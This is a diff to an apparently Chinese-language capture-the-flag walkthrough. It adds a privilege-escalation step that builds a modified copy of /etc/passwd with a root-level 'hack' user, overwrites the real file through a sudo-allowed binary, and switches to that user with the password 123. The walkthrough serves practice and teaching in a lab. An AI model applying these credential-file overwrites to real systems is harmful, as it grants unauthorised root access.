@@ -70,6 +70,8 @@ stty raw -echo;fg//- 通过 `stty raw -echo` 将当前终端设置为原始模
 reset //重新初始化终端
 ```
 # 提权
+**配置 sudo [命令](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.linuxcool.com%2F)在运行时而不输入密码。** |此设置在 /etc/sudoers文件中完成，这是使用 sudo [命令](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.linuxcool.com%2F)的默认安全策略；在用户权限指定部分
+
 尝试读取第一个flag读取不到cat /home/ocean/user.txt
 
 ```C
@@ -114,7 +116,8 @@ cp /etc/passwd /tmp/file
 mkpasswd -m sha-512
 复制值到file的最后一行中,并按照格式修改成root用户hack:$6$8NJrwgxTZMywbrec$f7JVOZGjIXI0UnN6Ovdv0kzyqiWkhqpIgBOyJOX2AHX4Z4SGuBo8D17cYAolVkVbEtNwQ75ze90uhHbIsA21a0:0:0:root:/root:/bin/bash
 
-
+sudo -u root /usr/local/bin/trans -i /tmp/file -o /etc/passwd -no-auto
+su hack //密码：123
 ```
 
 ```C
